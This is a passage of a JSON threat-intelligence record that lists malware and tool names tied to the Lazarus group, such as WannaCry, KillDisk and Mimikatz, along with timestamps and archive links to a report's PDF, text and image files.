                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716502,
    "ts_updated_at": 1743041842,
    "ts_creation_date": 1487827161,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/4068d909a958924e1d908f6adc21ea998d1eb891.pdf",
        "text": "https://archive.orkl.eu/4068d909a958924e1d908f6adc21ea998d1eb891.txt",
        "img": "https://archive.orkl.eu/4068d909a958924e1d908f6adc21ea998d1eb891.jpg"
    }
}